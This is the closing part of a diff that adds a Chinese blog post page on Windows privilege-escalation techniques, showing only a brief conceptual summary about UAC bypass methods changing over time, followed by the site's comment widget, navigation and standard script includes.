+<p><img src="/2022/11/08/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/image-20221107164830632.png" srcset="/img/loading.gif" lazyload alt="image-20221107164830632"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>实现Bypass UAC的方法很多，并不局限于白名单程序和COM接口技术。对于不同的Bypass UAC方法，其具体的实现过程大都不一样。随着操作系统的升级更新，现在对于Bypass UAC成功的方法，可能在以后不再适用，但也会有新的BypassUAC方法出现，攻与防是相互博奔的过程。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Windows%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/">Windows黑客编程技术</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/C-%E7%BC%96%E7%A8%8B/">C++编程</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/04/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/">
+                        <span class="hidden-mobile">自启动技术</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://unpkg.com/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"p4y64BT0Xe4gNN6V3D3J31XG-gzGzoHsz","appKey":"gaaGO0djz3T4tJHrM9kjHYMx","path":"window.location.pathname","placeholder":"随便说点什么吧~兄弟","avatar":"retro","meta":["nick"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-github-fill"></i> <a href="https://github.com/wangchenChina" target="_blank" rel="nofollow noopener"><span>Github</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://unpkg.com/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://unpkg.com/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://unpkg.com/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://unpkg.com/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
